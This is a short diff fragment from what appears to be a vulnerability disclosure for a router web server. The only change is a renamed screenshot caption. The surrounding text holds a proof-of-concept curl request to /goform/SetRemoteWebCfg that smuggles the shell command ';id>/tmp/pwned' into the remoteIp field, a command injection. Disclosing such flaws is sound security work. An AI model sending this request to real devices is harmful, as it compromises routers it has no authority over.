@@ -14,4 +14,4 @@ In the httpd binary, the function `formSetSafeWanWebMan` handles requests to `/g
 curl -i -X POST http://192.168.0.1/goform/SetRemoteWebCfg -d "remoteWebEn=1&remoteIp=1.2.3.4;id>/tmp/pwned&remotePort=8080"
 ```
 
-![Handler accepts injected payload](screenshots/2.png)
+![PoC result](screenshots/2.png)
